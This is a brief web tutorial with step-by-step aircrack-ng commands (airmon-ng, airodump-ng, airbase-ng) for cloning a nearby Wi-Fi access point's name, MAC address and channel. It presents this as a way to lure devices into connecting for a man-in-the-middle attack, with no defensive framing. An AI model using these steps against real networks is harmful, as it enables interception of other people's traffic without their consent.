<p style="text-indent: 80">Let us see how to create an Evil Twin for an access point using Kali Linux and aircrack-ng suite </p>
<br>
<br>
<p>1. Start up Kali Linux. First we need to start the monitor mode in the wireless interface card. Open terminal and type <br><b>airmon-ng start (interface)</b></p>
<br>

<br>
<p>2. Then we have to scan for the access point that we are going to twin. Type <br><b>airodump-ng (interface)</b></p>
<br>

<br>
<p>3. After you have seen the access point, press <b>ctrl+c to stop scanning.</b></p>

<br>
<p>4. Then we have to duplicate the access point. There is a package called airbase-ng which will start an access point by the mac address and the name that we provide. So type<br><b>airbase-ng -a (mac address of access point) --essid "(name of the access point)" -c (channel of the access point)  (interface)</b></p>

<br>
<p>5. Then we can see the other devices getting associated with your access point. By doing this we can be able to perform the man in the middle attack.</p>
